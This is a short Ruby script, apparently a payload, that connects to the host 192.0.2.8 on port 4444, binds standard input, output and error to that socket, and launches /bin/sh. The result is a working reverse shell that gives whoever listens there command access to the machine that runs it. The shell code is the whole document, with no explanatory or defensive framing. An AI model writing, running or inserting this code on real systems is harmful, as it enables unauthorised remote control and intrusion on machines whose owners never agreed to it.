require 'socket'
s = TCPSocket.new('192.0.2.8', 4444)
STDIN.reopen(s)
STDOUT.reopen(s)
STDERR.reopen(s)
exec('/bin/sh')
